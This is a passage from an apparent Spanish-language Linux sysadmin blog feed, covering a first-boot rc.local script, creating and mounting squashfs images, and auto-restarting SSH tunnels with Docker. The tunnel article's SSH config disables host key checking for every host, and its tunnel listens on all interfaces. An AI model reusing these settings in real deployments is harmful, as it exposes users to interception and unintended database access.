    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; ! -e &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;LOG&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
        &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SCRIPT&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &amp;gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;LOG&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
    &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="k"&gt;fi&lt;/span&gt;
root@firstboot:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Básicamente, preguntamos si el &lt;em&gt;script&lt;/em&gt; existe y es ejecutable, y en ese caso, si no existe el log previamente generado. En caso afirmativo, ejecutamos el script y recogemos la salida, a modo de &lt;em&gt;log&lt;/em&gt; y a modo de marca para no volver a lanzarlo.&lt;/p&gt;
&lt;p&gt;Solo nos queda pendiente darle permisos de ejecución, porque sino, &lt;strong&gt;systemd&lt;/strong&gt; lo ignoraría.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@firstboot:~# chmod a+x /etc/rc.local
root@firstboot:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Usando la plantilla&lt;/h3&gt;
&lt;p&gt;Hemos llegado a ese momento en el que clonamos la plantilla y tenemos que poner el &lt;em&gt;script&lt;/em&gt; de inicialización. Siguiendo el &lt;em&gt;script&lt;/em&gt; arriba mencionado, solo tenemos que poner un &lt;em&gt;script&lt;/em&gt; que haga lo que nos interese. En este caso, con un &lt;em&gt;log&lt;/em&gt; para ver que funciona, nos vale.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@firstboot:~# cat firstboot.sh
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;First time boot. Running as:&amp;quot;&lt;/span&gt;
id
root@firstboot:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No os olvidéis de darle permisos de ejecución:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@firstboot:~# chmod a+x firstboot.sh
root@firstboot:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si reiniciamos el servidor podremos ver la magia: como hay un script y no hay &lt;em&gt;log&lt;/em&gt;, se va a ejecutar, generando el &lt;em&gt;log&lt;/em&gt;. Solo nos queda verlo en directo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@firstboot:~# cat firstboot.log
First &lt;span class="nb"&gt;time&lt;/span&gt; boot. Running as:
&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;grupos&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt;
root@firstboot:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y por mucho que reiniciéis, no se va a volver a ejecutar, a menos claro, que eliminéis el fichero de &lt;em&gt;log&lt;/em&gt;, dejando el &lt;em&gt;script&lt;/em&gt; en su sitio.&lt;/p&gt;
&lt;h3&gt;Uso práctico&lt;/h3&gt;
&lt;p&gt;En mi caso concreto, he creado &lt;em&gt;scripts&lt;/em&gt; genéricos para instalar:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Un servidor de &lt;strong&gt;mongodb&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Un servidor &lt;strong&gt;uwsgi&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Un frontal &lt;strong&gt;nginx&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Un balanceador &lt;strong&gt;haproxy&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Así pues, cuando creo un proyecto nuevo, solo tengo que asignar los &lt;em&gt;script&lt;/em&gt; correspondientes a cada instancia de mi &lt;em&gt;hosting&lt;/em&gt;. Con algunas modificaciones a los ficheros de configuración y la aplicación propiamente dicha, tengo un entorno corriendo en tiempo record.&lt;/p&gt;</content><category term="systemd"></category><category term="script"></category></entry><entry><title>Un sistema de ficheros comprimido y de solo lectura: squashfs</title><link href="https://www.linuxsysadmin.ml/2018/02/un-sistema-de-ficheros-comprimido-y-de-solo-lectura-squashfs.html" rel="alternate"></link><published>2018-02-19T10:00:00+01:00</published><updated>2018-02-19T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-02-19:/2018/02/un-sistema-de-ficheros-comprimido-y-de-solo-lectura-squashfs.html</id><summary type="html">&lt;p&gt;Cuando trabajamos con tamaños de disco muy limitados, como por ejemplo en dispositivos &lt;em&gt;embedded&lt;/em&gt; o &lt;em&gt;pendrives&lt;/em&gt;, nos vemos obligados a reducir nuestros sistemas de ficheros. Algunos de estos sistemas de ficheros son de solo lectura, y vienen comprimidos, lo que nos permite ahorrar en espacio de disco, no en funcionalidades …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando trabajamos con tamaños de disco muy limitados, como por ejemplo en dispositivos &lt;em&gt;embedded&lt;/em&gt; o &lt;em&gt;pendrives&lt;/em&gt;, nos vemos obligados a reducir nuestros sistemas de ficheros. Algunos de estos sistemas de ficheros son de solo lectura, y vienen comprimidos, lo que nos permite ahorrar en espacio de disco, no en funcionalidades.&lt;/p&gt;
&lt;p&gt;En este campo aparece el nombre de &lt;em&gt;squashfs&lt;/em&gt;, que es básicamente un sistema de ficheros &lt;em&gt;ext2&lt;/em&gt; comprimido. La única diferencia entre &lt;em&gt;ext2&lt;/em&gt;, &lt;em&gt;ext3&lt;/em&gt; y &lt;em&gt;ext4&lt;/em&gt; es el &lt;em&gt;journal&lt;/em&gt;, que es el registro encargado de que no se pierdan las escrituras hechas en el disco en caso de fallo antes de &lt;em&gt;flushear&lt;/em&gt; lo &lt;em&gt;bufferes&lt;/em&gt;, así que la version &lt;em&gt;ext2&lt;/em&gt; no es ni un atraso ni un impedimento.&lt;/p&gt;
&lt;h2&gt;Creación del sistema de ficheros&lt;/h2&gt;
&lt;p&gt;Para crear un sistema de ficheros nos hacen falta las herramientas &lt;strong&gt;mksquashfs&lt;/strong&gt; y posiblemente el decompresor &lt;strong&gt;unsquashfs&lt;/strong&gt;. En &lt;em&gt;Debian&lt;/em&gt; se pueden obtener instalando el paquete &lt;strong&gt;squashfs-tools&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ sudo apt-get install squashfs-tools
&lt;span class="o"&gt;[&lt;/span&gt;sudo&lt;span class="o"&gt;]&lt;/span&gt; password &lt;span class="k"&gt;for&lt;/span&gt; gerard:
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
Se instalarán los siguientes paquetes adicionales:
  liblzo2-2
Se instalarán los siguientes paquetes NUEVOS:
  liblzo2-2 squashfs-tools
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;2&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;179&lt;/span&gt; kB de archivos.
Se utilizarán &lt;span class="m"&gt;488&lt;/span&gt; kB de espacio de disco adicional después de esta operación.
¿Desea continuar? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a crear un sistema de ficheros normal en un carpeta, que luego vamos a comprimir. Hoy, y a modo de ejemplo, vamos a crearlos con ficheros de contenido aleatorio; normalmente suelo poner jaulas o partes del sistema operativo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/squashtest$ mkdir rootfs
gerard@atlantis:~/squashtest$ dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/urandom &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/stdout &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1K &lt;span class="nv"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; base64 &amp;gt; rootfs/file1
&lt;span class="m"&gt;10&lt;/span&gt;+0 registros leídos
&lt;span class="m"&gt;10&lt;/span&gt;+0 registros escritos
&lt;span class="m"&gt;10240&lt;/span&gt; bytes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt; kB, &lt;span class="m"&gt;10&lt;/span&gt; KiB&lt;span class="o"&gt;)&lt;/span&gt; copied, &lt;span class="m"&gt;0&lt;/span&gt;,000641935 s, &lt;span class="m"&gt;16&lt;/span&gt;,0 MB/s
gerard@atlantis:~/squashtest$ dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/urandom &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/stdout &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1K &lt;span class="nv"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; base64 &amp;gt; rootfs/file2
&lt;span class="m"&gt;10&lt;/span&gt;+0 registros leídos
&lt;span class="m"&gt;10&lt;/span&gt;+0 registros escritos
&lt;span class="m"&gt;10240&lt;/span&gt; bytes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt; kB, &lt;span class="m"&gt;10&lt;/span&gt; KiB&lt;span class="o"&gt;)&lt;/span&gt; copied, &lt;span class="m"&gt;0&lt;/span&gt;,000119261 s, &lt;span class="m"&gt;85&lt;/span&gt;,9 MB/s
gerard@atlantis:~/squashtest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si miramos lo que nos ha quedado, vemos que el resultado es el correcto. Tened en cuenta que la carpeta contenedora &lt;em&gt;rootfs&lt;/em&gt; se considerará la raíz del sistema de ficheros.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/squashtest$ tree -h
.
└── &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;.0K&lt;span class="o"&gt;]&lt;/span&gt;  rootfs
    ├── &lt;span class="o"&gt;[&lt;/span&gt; 14K&lt;span class="o"&gt;]&lt;/span&gt;  file1
    └── &lt;span class="o"&gt;[&lt;/span&gt; 14K&lt;span class="o"&gt;]&lt;/span&gt;  file2

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;2&lt;/span&gt; files
gerard@atlantis:~/squashtest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos queda lanzar el comando &lt;strong&gt;mksquashfs&lt;/strong&gt; que se encargará de comprimir el conjunto de carpetas que indiquemos y creará el fichero que declaremos en el último parámetro.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/squashtest$ mksquashfs rootfs/ rootfs.sqsh
Parallel mksquashfs: Using &lt;span class="m"&gt;1&lt;/span&gt; processor
Creating &lt;span class="m"&gt;4&lt;/span&gt;.0 filesystem on rootfs.sqsh, block size &lt;span class="m"&gt;131072&lt;/span&gt;.
&lt;span class="o"&gt;[==================================================================================================================================================================================================&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;/2 &lt;span class="m"&gt;100&lt;/span&gt;%

Exportable Squashfs &lt;span class="m"&gt;4&lt;/span&gt;.0 filesystem, gzip compressed, data block size &lt;span class="m"&gt;131072&lt;/span&gt;
        compressed data, compressed metadata, compressed fragments, compressed xattrs
        duplicates are removed
Filesystem size &lt;span class="m"&gt;20&lt;/span&gt;.80 Kbytes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.02 Mbytes&lt;span class="o"&gt;)&lt;/span&gt;
        &lt;span class="m"&gt;76&lt;/span&gt;.13% of uncompressed filesystem size &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;27&lt;/span&gt;.32 Kbytes&lt;span class="o"&gt;)&lt;/span&gt;
Inode table size &lt;span class="m"&gt;53&lt;/span&gt; bytes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.05 Kbytes&lt;span class="o"&gt;)&lt;/span&gt;
        &lt;span class="m"&gt;54&lt;/span&gt;.08% of uncompressed inode table size &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;98&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt;
Directory table size &lt;span class="m"&gt;30&lt;/span&gt; bytes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.03 Kbytes&lt;span class="o"&gt;)&lt;/span&gt;
        &lt;span class="m"&gt;75&lt;/span&gt;.00% of uncompressed directory table size &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;40&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt;
Number of duplicate files found &lt;span class="m"&gt;0&lt;/span&gt;
Number of inodes &lt;span class="m"&gt;3&lt;/span&gt;
Number of files &lt;span class="m"&gt;2&lt;/span&gt;
Number of fragments &lt;span class="m"&gt;1&lt;/span&gt;
Number of symbolic links  &lt;span class="m"&gt;0&lt;/span&gt;
Number of device nodes &lt;span class="m"&gt;0&lt;/span&gt;
Number of fifo nodes &lt;span class="m"&gt;0&lt;/span&gt;
Number of socket nodes &lt;span class="m"&gt;0&lt;/span&gt;
Number of directories &lt;span class="m"&gt;1&lt;/span&gt;
Number of ids &lt;span class="o"&gt;(&lt;/span&gt;unique uids + gids&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
Number of uids &lt;span class="m"&gt;1&lt;/span&gt;
        gerard &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
Number of gids &lt;span class="m"&gt;1&lt;/span&gt;
        gerard &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
gerard@atlantis:~/squashtest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver en este caso que el tamaño del sistema de ficheros final es solamente el 76.13% de lo que era antes de comprimir. No es mucho, pero con ficheros más realistas suele comprimir más, pero de momento nos vale. Veamos el tamaño final del sistema de ficheros, que se queda en 24kb:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/squashtest$ ls -lh
total 28K
drwxr-xr-x &lt;span class="m"&gt;2&lt;/span&gt; gerard gerard &lt;span class="m"&gt;4&lt;/span&gt;,0K sep &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;:43 rootfs
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard  24K sep &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;:44 rootfs.sqsh
gerard@atlantis:~/squashtest$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Uso del sistema de ficheros&lt;/h2&gt;
&lt;p&gt;Para montar el sistema de ficheros no nos hace falta nada especial, ni ninguna de las &lt;strong&gt;squashfs-tools&lt;/strong&gt;, al menos en &lt;em&gt;Debian&lt;/em&gt;, que ya incluye el módulo de &lt;em&gt;squashfs&lt;/em&gt; en el &lt;em&gt;kernel&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;El fichero &lt;em&gt;rootfs.sqsh&lt;/em&gt; no sirve por si solo; hay que montarlo. Supongamos que queremos montar nuestro nuevo sistema de ficheros en la carpeta &lt;em&gt;mount/&lt;/em&gt;, que al no existir, crearemos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/squashtest$ mkdir mount
gerard@atlantis:~/squashtest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El comando de montaje no es diferente de cualquier otro, y lo podríamos poner en el &lt;em&gt;/etc/fstab&lt;/em&gt; para que se monte solo en cada reinicio. De momento os paso el comando de &lt;em&gt;mount&lt;/em&gt; básico, que demuestra lo fácil que es de hacer:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/squashtest$ sudo mount rootfs.sqsh mount/
&lt;span class="o"&gt;[&lt;/span&gt;sudo&lt;span class="o"&gt;]&lt;/span&gt; password &lt;span class="k"&gt;for&lt;/span&gt; gerard:
gerard@atlantis:~/squashtest$ tree mount/
mount/
├── file1
└── file2

&lt;span class="m"&gt;0&lt;/span&gt; directories, &lt;span class="m"&gt;2&lt;/span&gt; files
gerard@atlantis:~/squashtest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como todo sistema de ficheros montado en &lt;em&gt;linux&lt;/em&gt;, queda accesible en la carpeta de montaje. Para acceder a los ficheros solo necesitamos hacerlo de la forma habitual, aunque por tratarse de un sistema de ficheros de solo lectura, solo podemos leerlo, pero no escribirlo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/squashtest$ touch mount/hello
touch: no se puede efectuar &lt;span class="sb"&gt;`&lt;/span&gt;touch&lt;span class="s1"&gt;&amp;#39; sobre &amp;#39;&lt;/span&gt;mount/hello&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;: Sistema de ficheros de sólo lectura
gerard@atlantis:~/squashtest$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Añadiendo una capa de lectura y escritura&lt;/h2&gt;
&lt;p&gt;Un sistema de ficheros de lectura solo no tiene mucha utilidad en sí misma; aunque es verdad que podemos poner la jaula como solo lectura y montar una carpeta de trabajo solamente. Sin embargo hay otro método ámpliamente utilizado para hacer que parezca de lectura y escritura.&lt;/p&gt;
&lt;p&gt;Se trata del método que utiliza la distribución &lt;a href="https://www.slax.org/es/"&gt;Slax&lt;/a&gt;. La idea es que el sistema de ficheros "final" es una carpeta en la que se montan varias capas de sistema de ficheros. Esto se consigue con sistemas de ficheros tipo &lt;em&gt;UnionFS&lt;/em&gt;, &lt;em&gt;AUFS&lt;/em&gt; o &lt;em&gt;overlayfs&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;De esta forma podemos tener la imagen base, posiblemente compartida por varios montajes distintos, y luego disponer de varias capas de diferencias respecto al original. Estas capas de diferencias suelen ser más pequeñas que la imagen base y se pueden descartar para volver a la versíon original de lo que teníamos en la carpeta.&lt;/p&gt;</content><category term="squashfs"></category><category term="mount"></category><category term="filesystem"></category></entry><entry><title>Túneles SSH con reinicio automático con Docker</title><link href="https://www.linuxsysadmin.ml/2018/02/tuneles-ssh-con-reinicio-automatico-con-docker.html" rel="alternate"></link><published>2018-02-12T10:00:00+01:00</published><updated>2018-02-12T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-02-12:/2018/02/tuneles-ssh-con-reinicio-automatico-con-docker.html</id><summary type="html">&lt;p&gt;Ya vimos en &lt;a href="https://www.linuxsysadmin.ml/2016/11/levantando-tuneles-ssh-con-systemd.html"&gt;un artículo anterior&lt;/a&gt; como delegar en &lt;strong&gt;SystemD&lt;/strong&gt; la persistencia de túneles SSH. El otro día intenté reproducirlo sin éxito en un servidor con una versión baja de &lt;strong&gt;SystemD&lt;/strong&gt;; finalmente me di cuenta de que había otra herramienta en el servidor capaz de reiniciar un túnel caído: &lt;strong&gt;Docker …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ya vimos en &lt;a href="https://www.linuxsysadmin.ml/2016/11/levantando-tuneles-ssh-con-systemd.html"&gt;un artículo anterior&lt;/a&gt; como delegar en &lt;strong&gt;SystemD&lt;/strong&gt; la persistencia de túneles SSH. El otro día intenté reproducirlo sin éxito en un servidor con una versión baja de &lt;strong&gt;SystemD&lt;/strong&gt;; finalmente me di cuenta de que había otra herramienta en el servidor capaz de reiniciar un túnel caído: &lt;strong&gt;Docker&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;El problema&lt;/h2&gt;
&lt;p&gt;El contexto no cambia respecto al citado artículo: tengo un servidor ejecutando los servicios de &lt;strong&gt;MongoDB&lt;/strong&gt; y &lt;strong&gt;SSH&lt;/strong&gt;, pero no puedo acceder a la base de datos porque expone su &lt;em&gt;socket&lt;/em&gt; solo a &lt;em&gt;localhost&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;En circunstancias normales, el túnel es trivial:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ssh -L &lt;span class="m"&gt;9999&lt;/span&gt;:localhost:27017 usuario@servidor -Nf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pero en mi entorno de trabajo, debido a directivas de seguridad arbitrarias, ese túnel se caía demasiado a menudo, y levantarlo manualmente era muy pesado.&lt;/p&gt;
&lt;h2&gt;La solución&lt;/h2&gt;
&lt;p&gt;Fallado el intento con &lt;strong&gt;SystemD&lt;/strong&gt;, decidí dar un intento a &lt;strong&gt;Docker&lt;/strong&gt;, y este es el resultado; se trata solamente de una imagen con el cliente &lt;strong&gt;SSH&lt;/strong&gt; que más nos convenga, con una distribución base de nuestro agrado, por ejemplo, &lt;strong&gt;Alpine Linux&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/tunnelmaker$ cat context/Dockerfile 
FROM alpine:3.6
RUN apk add --no-cache openssh-client
gerard@sirius:~/docker/tunnelmaker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con estas herramientas, nos valdría con lanzar el comando del túnel, pero habrá que acompañar el contenedor hecho a partir de esta imagen de varias cosas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;La clave &lt;strong&gt;SSH&lt;/strong&gt; para levantar el túnel sin contraseña, evitando una intervención manual o el fallo directo del &lt;code&gt;docker run&lt;/code&gt;. Por supuesto, el servidor destino debe aceptar la clave para el usuario indicado en el comando del túnel.&lt;/li&gt;
&lt;li&gt;Una configuración &lt;strong&gt;SSH&lt;/strong&gt; cliente que impida detenernos en el momento de aceptar el &lt;em&gt;fingerprint&lt;/em&gt; del servidor destino.&lt;/li&gt;
&lt;li&gt;El propio comando del túnel &lt;strong&gt;SSH&lt;/strong&gt;, que no hemos puesto en el &lt;em&gt;Dockerfile&lt;/em&gt; para poder levantar diferentes túneles con la misma imagen.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Es especialmente importante respetar el usuario y los permisos de los fichero &lt;em&gt;id_rsa&lt;/em&gt; y &lt;em&gt;config&lt;/em&gt;, siendo &lt;code&gt;root:root:600&lt;/code&gt; para el primero y &lt;code&gt;root:root:644&lt;/code&gt; para el segundo.&lt;/p&gt;
&lt;p&gt;Podemos levantar esta imagen con el comando &lt;code&gt;docker run&lt;/code&gt; habitual, pero como tiene varios añadidos, y por comodidad, usaremos &lt;strong&gt;docker-compose&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/tunnelmaker$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  mongotunnel:
    build: context
    volumes:
      - ./id_rsa:/root/.ssh/id_rsa
      - ./config:/root/.ssh/config
    ports:
      - &lt;span class="s2"&gt;&amp;quot;27777:9999&amp;quot;&lt;/span&gt;
    extra_hosts:
      - &lt;span class="s2"&gt;&amp;quot;mongoserver:192.168.1.135&amp;quot;&lt;/span&gt;
    command: ssh -L &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:9999:localhost:27017 jump@mongoserver -N
    stdin_open: &lt;span class="nb"&gt;true&lt;/span&gt;
    restart: always
gerard@sirius:~/docker/tunnelmaker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos observar el el fichero &lt;em&gt;docker-compose.yml&lt;/em&gt; otras varias anomalías:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;restart: always&lt;/strong&gt; &amp;rarr; Este es el punto de todo el artículo; queremos que cuando el túnel se caiga, el mismo demonio de &lt;strong&gt;Docker&lt;/strong&gt; se ocupe de levantarlo de nuevo.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; stdin_open: true&lt;/strong&gt; &amp;rarr; Sin este parámetro, el túnel se cerraba nada más establecerse; sospecho que esta era la causa de que no funcionara la solución con &lt;strong&gt;SystemD&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;extra_hosts&lt;/strong&gt; &amp;rarr; No es indispensable, pero he querido utilizar nombres de servidor por claridad, aunque no dispongo de resolución de nombres para mis servidores locales. Esto añade la correspondiente entrada en &lt;em&gt;/etc/hosts&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ports&lt;/strong&gt; &amp;rarr; Nuestro contenedor va a levantar el túnel en el puerto arbitrario 9999; lo mapeamos en cualquier puerto que tengamos libre en nuestro ordenador.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Adjunto la configuración &lt;strong&gt;SSH&lt;/strong&gt; para tener el ejemplo completo. No pongo la clave privada &lt;strong&gt;SSH&lt;/strong&gt; por razones de seguridad obvias; tendréis que generar vuestro propio par con el comando &lt;strong&gt;ssh-keygen&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/tunnelmaker$ cat config 
Host *
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    ServerAliveInterval &lt;span class="m"&gt;60&lt;/span&gt;
gerard@sirius:~/docker/tunnelmaker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;El resultado&lt;/h2&gt;
&lt;p&gt;Solo necesitamos levantar el contenedor usando &lt;strong&gt;docker-compose&lt;/strong&gt; para poder observar el resultado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/tunnelmaker$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;tunnelmaker_default&amp;quot;&lt;/span&gt; with the default driver
Creating tunnelmaker_mongotunnel_1
gerard@sirius:~/docker/tunnelmaker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora podremos acceder sin problemas a dicho servidor de bases de datos como si se encontrase en el puerto 27777 local; solo hace falta comprobarlo usando, por ejemplo, el mismo cliente de &lt;strong&gt;MongoDB&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker$ mongo --port &lt;span class="m"&gt;27777&lt;/span&gt;
MongoDB shell version v3.4.7
connecting to: mongodb://127.0.0.1:27777/
MongoDB server version: &lt;span class="m"&gt;3&lt;/span&gt;.4.4
...  
&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


